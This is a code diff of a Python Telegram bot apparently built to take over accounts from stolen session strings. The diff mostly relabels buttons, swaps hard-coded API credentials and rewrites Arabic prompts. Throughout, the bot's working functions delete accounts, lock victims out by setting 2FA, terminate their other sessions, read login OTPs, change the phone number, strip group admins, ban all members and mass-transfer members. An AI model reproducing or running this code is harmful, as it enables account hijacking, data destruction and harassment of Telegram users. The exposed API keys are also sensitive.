@@ -159,34 +159,33 @@ async def hack(event):
     async with client.conversation(event.chat_id) as x:
             keyboard = [
                 [
-                    Button.inline('Gold_1', data='Gold_1'), 
-                    Button.inline('Gold_2', data='Gold_2'),
-                    Button.inline('Gold_3', data='Gold_3'),
-                    Button.inline('Gold_4', data='Gold_4'),
-                    Button.inline('Gold_5', data='Gold_5')
+                    Button.inline('A', data='A'), 
+                    Button.inline('B', data='B'),
+                    Button.inline('C', data='C'),
+                    Button.inline('D', data='D'),
+                    Button.inline('E', data='E')
                 ],
                 [
-                    Button.inline('Gold_6', data='Gold_6'), 
-                    Button.inline('Gold_7', data='Gold_7'),
-                    Button.inline('Gold_8', data='Gold_8'),
-                    Button.inline('Gold_9', data='Gold_9'),
-                    Button.inline('Gold_10', data='Gold_10')
+                    Button.inline('F', data='F'), 
+                    Button.inline('G', data='G'),
+                    Button.inline('H', data='H'),
+                    Button.inline('I', data='I'),
+                    Button.inline('J', data='J')
                 ],
                 [
-                    Button.inline('Gold_11', data='Gold_11'), 
-                    Button.inline('Gold_12', data='Gold_12'),
-                    Button.inline('Gold_13', data='Gold_13'),
-                    Button.inline('Gold_14', data='Gold_14'),
-                    Button.inline('Gold_15', data='Gold_15'),
+                    Button.inline('K', data='K'), 
+                    Button.inline('L', data='L'),
+                    Button.inline('M', data='M'),
+                    Button.inline('N', data='N'),
+                    Button.inline('O', data='O'),
                 ],
                 [ 
                     
-                    Button.inline('Gold_16', data='Gold_16'),
-                    Button.inline('Gold_17', data='Gold_17'),
-                    Button.inline('Gold_18', data='Gold_18'),
-                    Button.inline('Gold_19', data='Gold_19'),
-                    Button.inline('Gold_20', data='Gold_20'),
-
+                    Button.inline('P', data='P'),
+                    Button.inline('Q', data='Q'),
+                    Button.inline('R', data='R'),
+                    Button.inline('S', data='S'),
+                    Button.inline('T', data='T'),
                 ],
                 [
                     Button.url('Developer', f'https://t.me/{devuser}')
@@ -224,7 +223,7 @@ async def hack(event):
 
 # 14 : ارسال اي رسالة ال كروب او خاص
 
-# 15 : تسجيل خروج الترمكس  (هاذا الامر يلغي الترمكس للابد)
+# 15 : تسجيل خروج السيشن  (هاذا الامر يلغي السيشن للابد)
 
 # 16 : اخراج المستخدم من جميع الكروبات والقنوات
 
@@ -293,7 +292,7 @@ async def send_help(event):
 
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
     bot = client = X
 
     try: 
@@ -307,7 +306,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
     bot = client = X
 
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -322,7 +321,7 @@ async def change_number(strses, number):
   
 async def userinfo(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     # Get the "me" object
@@ -354,7 +353,7 @@ async def userinfo(strses):
 
 async def userinfop(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     # Get the "me" object
@@ -384,29 +383,29 @@ async def userinfop(strses):
     return info
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     await X(rt())
 
 
 async def terminatep(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     await bot(rt())
 
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     await X(functions.account.DeleteAccountRequest("I am session note"))
 
 async def delaccp(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     await bot(functions.account.DeleteAccountRequest("I am session note"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
@@ -414,7 +413,7 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def promotep(strses, grp, user):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     try:
@@ -423,7 +422,7 @@ async def promotep(strses, grp, user):
       await bot.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
 
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     try:
       await X.edit_2fa(f'{devuser} was here')
@@ -432,7 +431,7 @@ async def user2fa(strses):
       return False
 
 async def user2fap(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     try:
       await bot.edit_2fa(f'{devuser} was here')
@@ -442,7 +441,7 @@ async def user2fap(strses):
 
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -451,7 +450,7 @@ async def demall(strses, grp):
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
 async def demallp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     async for x in bot.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -461,13 +460,13 @@ async def demallp(strses, grp):
       
 
 async def joingroup(strses, usernames):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
         for username in usernames:
             await X(join(username.strip()))
 
 async def joingroupp(strses, usernames):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     for username in usernames:
@@ -475,36 +474,36 @@ async def joingroupp(strses, usernames):
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
     await X(leave(username))
 
 async def leavegroupp(strses, username):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     await bot(leave(username))
 
 
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
     await X(dc(username))
     
 async def delgroupp(strses, username):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     await bot(dc(username))
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
     i = ""
 
     async for x in X.iter_messages(777000, limit=3):
@@ -513,7 +512,7 @@ async def usermsgs(strses):
     return str(i)
 
 async def usermsgsp(strses):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect() 
     i = ""
 
@@ -524,7 +523,7 @@ async def usermsgsp(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
     try:
       await X(leave("@vip_nasa"))
     except BaseException:
@@ -549,7 +548,7 @@ async def userbans(strses, grp):
         pass
     
 async def userbansp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     k = await bot.get_participants(grp)
     for x in k:
@@ -560,7 +559,7 @@ async def userbansp(strses, grp):
     
 
 async def userchannels(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
 
         k = await X(pc())
         i = ""
@@ -579,7 +578,7 @@ async def userchannels(strses):
 
 async def userchannelsp(strses):
     # Create a TelegramClient instance
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     k = await bot(pc())
     i = ""
@@ -601,7 +600,7 @@ from telethon.tl.functions.channels import LeaveChannelRequest
 
 
 async def leaveall(session_string):
-    async with tg(ses(session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(session_string), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         dialogs = await X.get_dialogs()
 
         for dialog in dialogs:
@@ -610,7 +609,7 @@ async def leaveall(session_string):
                 await X(leave(entity))
 
 async def leaveallp(session_string):
-    bot = TelegramClient((session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((session_string), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     dialogs = await bot.get_dialogs()
 
@@ -622,7 +621,7 @@ import logging
 logging.basicConfig(level=logging.WARNING)
 
 async def transfer(strses, group1_id_or_username, group2_id_or_username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         try:
             # Fetch members from the first group
             group1_entity = await X.get_entity(group1_id_or_username)
@@ -650,34 +649,33 @@ async def transfer(strses, group1_id_or_username, group2_id_or_username):
 
 keyboard = [
                 [
-                    Button.inline('Gold_1', data='Gold_1'), 
-                    Button.inline('Gold_2', data='Gold_2'),
-                    Button.inline('Gold_3', data='Gold_3'),
-                    Button.inline('Gold_4', data='Gold_4'),
-                    Button.inline('Gold_5', data='Gold_5')
+                    Button.inline('A', data='A'), 
+                    Button.inline('B', data='B'),
+                    Button.inline('C', data='C'),
+                    Button.inline('D', data='D'),
+                    Button.inline('E', data='E')
                 ],
                 [
-                    Button.inline('Gold_6', data='Gold_6'), 
-                    Button.inline('Gold_7', data='Gold_7'),
-                    Button.inline('Gold_8', data='Gold_8'),
-                    Button.inline('Gold_9', data='Gold_9'),
-                    Button.inline('Gold_10', data='Gold_10')
+                    Button.inline('F', data='F'), 
+                    Button.inline('G', data='G'),
+                    Button.inline('H', data='H'),
+                    Button.inline('I', data='I'),
+                    Button.inline('J', data='J')
                 ],
                 [
-                    Button.inline('Gold_11', data='Gold_11'), 
-                    Button.inline('Gold_12', data='Gold_12'),
-                    Button.inline('Gold_13', data='Gold_13'),
-                    Button.inline('Gold_14', data='Gold_14'),
-                    Button.inline('Gold_15', data='Gold_15'),
+                    Button.inline('K', data='K'), 
+                    Button.inline('L', data='L'),
+                    Button.inline('M', data='M'),
+                    Button.inline('N', data='N'),
+                    Button.inline('O', data='O'),
                 ],
                 [ 
                     
-                    Button.inline('Gold_16', data='Gold_16'),
-                    Button.inline('Gold_17', data='Gold_17'),
-                    Button.inline('Gold_18', data='Gold_18'),
-                    Button.inline('Gold_19', data='Gold_19'),
-                    Button.inline('Gold_20', data='Gold_20'),
-
+                    Button.inline('P', data='P'),
+                    Button.inline('Q', data='Q'),
+                    Button.inline('R', data='R'),
+                    Button.inline('S', data='S'),
+                    Button.inline('T', data='T'),
                 ],
                 [
                     Button.url('Developer', f'https://t.me/{devuser}')
@@ -748,33 +746,33 @@ async def hack(event):
     async with client.conversation(event.chat_id) as x:
             keyboard = [
                 [
-                    Button.inline('Gold_1', data='Gold_1'), 
-                    Button.inline('Gold_2', data='Gold_2'),
-                    Button.inline('Gold_3', data='Gold_3'),
-                    Button.inline('Gold_4', data='Gold_4'),
-                    Button.inline('Gold_5', data='Gold_5')
+                    Button.inline('A', data='A'), 
+                    Button.inline('B', data='B'),
+                    Button.inline('C', data='C'),
+                    Button.inline('D', data='D'),
+                    Button.inline('E', data='E')
                 ],
                 [
-                    Button.inline('Gold_6', data='Gold_6'), 
-                    Button.inline('Gold_7', data='Gold_7'),
-                    Button.inline('Gold_8', data='Gold_8'),
-                    Button.inline('Gold_9', data='Gold_9'),
-                    Button.inline('Gold_10', data='Gold_10')
+                    Button.inline('F', data='F'), 
+                    Button.inline('G', data='G'),
+                    Button.inline('H', data='H'),
+                    Button.inline('I', data='I'),
+                    Button.inline('J', data='J')
                 ],
                 [
-                    Button.inline('Gold_11', data='Gold_11'), 
-                    Button.inline('Gold_12', data='Gold_12'),
-                    Button.inline('Gold_13', data='Gold_13'),
-                    Button.inline('Gold_14', data='Gold_14'),
-                    Button.inline('Gold_15', data='Gold_15'),
+                    Button.inline('K', data='K'), 
+                    Button.inline('L', data='L'),
+                    Button.inline('M', data='M'),
+                    Button.inline('N', data='N'),
+                    Button.inline('O', data='O'),
                 ],
                 [ 
                     
-                    Button.inline('Gold_16', data='Gold_16'),
-                    Button.inline('Gold_17', data='Gold_17'),
-                    Button.inline('Gold_18', data='Gold_18'),
-                    Button.inline('Gold_19', data='Gold_19'),
-                    Button.inline('Gold_20', data='Gold_20'),
+                    Button.inline('P', data='P'),
+                    Button.inline('Q', data='Q'),
+                    Button.inline('R', data='R'),
+                    Button.inline('S', data='S'),
+                    Button.inline('T', data='T'),
 
                 ],
                 [
@@ -810,7 +808,7 @@ async def hack(event):
 
 # 14 : ارسال اي رسالة ال كروب او خاص
 
-# 15 : تسجيل خروج الترمكس  (هاذا الامر يلغي الترمكس للابد)
+# 15 : تسجيل خروج السيشن  (هاذا الامر يلغي السيشن للابد)
 
 # 16 : اخراج المستخدم من جميع الكروبات والقنوات
 
@@ -853,7 +851,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can send you the channels/groups.
            
-الان ارسل لي الترمكس لكي ارسل لك القنوات وكروبات""")
+الان ارسل لي السيشن لكي ارسل لك القنوات وكروبات""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -907,13 +905,9 @@ async def users(event):
 
         except (SessionPasswordNeededError, PhoneNumberUnoccupiedError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
 
 
 _PYRO_FORM = {351: ">B?256sI?", 356: ">B?256sQ?", 362: ">BI?256sQ?"}
@@ -982,7 +976,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can send you all users info.
                            
-الان ارسل لي كود الترمكس لكي ارسل لك معلومات المستخدم""")
+الان ارسل لي كود السيشن لكي ارسل لك معلومات المستخدم""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
 
@@ -1017,13 +1011,9 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
 
 
 
@@ -1044,7 +1034,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can ban all group/channel members.
     
-الان ارسل لي كود الترمكس""")
+الان ارسل لي كود السيشن""")
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
@@ -1056,7 +1046,7 @@ async def users(event):
             if not session:
                 return await event.respond("""Invalid Session, please use another one.
     
-كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
+كود السيشن غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
 
             await x.send_message("""Send the Group or Channel's ID/username.
     
@@ -1089,9 +1079,7 @@ async def users(event):
 تم طرد كل الأعضاء""", buttons=keyboard)
         
         except TimeoutError:
-            return await event.respond("""Please provide the termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1116,7 +1104,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can send you the latest OTP.
                            
-الآن أرسل لي كود الترمكس لكي أرسل لك رمز الدخول الأحدث""")
+الآن أرسل لي كود السيشن لكي أرسل لك رمز الدخول الأحدث""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
@@ -1124,9 +1112,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -1147,9 +1133,7 @@ async def users(event):
             await message.edit(i + "\n\n start from top to bottom \n\n من الفوق الى الاسفل ابدا", buttons=keyboard)
         
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1170,16 +1154,14 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can make user join a group/channel.
                            
-الان ارسل لي كود الترمكس لكي ادخل المستخدم في قناة او كروب""")
+الان ارسل لي كود السيشن لكي ادخل المستخدم في قناة او كروب""")
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
             session = validate_session(strses.text)
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             
             await x.send_message("""Send the Group or Channel usernames, separated by commas.
@@ -1217,9 +1199,7 @@ Please make sure the channels or groups are public and that you have the necessa
                     buttons=keyboard
                 )
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 from telethon import errors
@@ -1250,9 +1230,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
 
             await x.send_message("""Send the ID or username of the channel/group.
@@ -1285,9 +1263,7 @@ async def users(event):
 المستخدم ليس عضو في الكروب / قناة """)
      
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
             
@@ -1316,7 +1292,7 @@ async def handle_users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can delete user's own channel/group.
                            
-الان ارسل لي كود الترمكس لكي احذف قناة او كروب المستخدم""")
+الان ارسل لي كود السيشن لكي احذف قناة او كروب المستخدم""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
@@ -1324,9 +1300,7 @@ async def handle_users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
 
             await x.send_message("""Send the Group or Channel's ID/username.
@@ -1361,9 +1335,7 @@ async def handle_users(event):
             finally:
                 await event.answer()
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1387,7 +1359,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can check if 2FA is activated.
                            
-الان ارسل لي كود الترمكس لكي ارى اذا المستخدم لديه تحقق بخطوتين""")
+الان ارسل لي كود السيشن لكي ارى اذا المستخدم لديه تحقق بخطوتين""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
@@ -1395,9 +1367,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -1423,9 +1393,7 @@ async def users(event):
         
 اسف، الشخص فعل التحقق بخطوتين""")
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1445,7 +1413,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can Terminate all other sessions.
                            
-الان ارسل لي كود الترمكس لكي انهي جميع الجلسات ماعدى البوت""")
+الان ارسل لي كود السيشن لكي انهي جميع الجلسات ماعدى البوت""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
@@ -1453,9 +1421,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -1483,9 +1449,7 @@ Please wait 24 hours before performing this action again.
 الجلسة الحالية جديدة جدًا ولا يمكن استخدامها لطرد الجلسات الأخرى حاليًا.
 يرجى الانتظار 24 ساعة قبل تنفيذ هذا الإجراء مرة أخرى.""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1504,7 +1468,7 @@ async def handle_delete_account(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can delete the account.
                            
-الان ارسل لي كود الترمكس لكي احذف الحساب""")
+الان ارسل لي كود السيشن لكي احذف الحساب""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
@@ -1512,9 +1476,7 @@ async def handle_delete_account(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -1541,7 +1503,7 @@ async def handle_delete_account(event):
         except TimeoutError:
             return await event.respond("""Please provide the termux session withing 60 seconds
             
-الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+الرجاء ارسال السيشن قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1572,7 +1534,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can add a user as admin.
                            
-الان ارسل لي كود الترمكس لكي ارفع مستخدم كادمن""")
+الان ارسل لي كود السيشن لكي ارفع مستخدم كادمن""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
@@ -1580,9 +1542,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             
             await x.send_message("""Send the Group or Channel's ID/username.
@@ -1620,9 +1580,7 @@ async def users(event):
          
 حدث خطا اثناء رفع الادمن""")
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         
 
 
@@ -1644,7 +1602,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can remove all admins.
                            
-الان ارسل لي كود الترمكس لكي ازالة جميع الادمنية""")
+الان ارسل لي كود السيشن لكي ازالة جميع الادمنية""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
@@ -1652,9 +1610,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             
             await x.send_message("""Send the Group or Channel's, Id/username.
@@ -1684,9 +1640,7 @@ async def users(event):
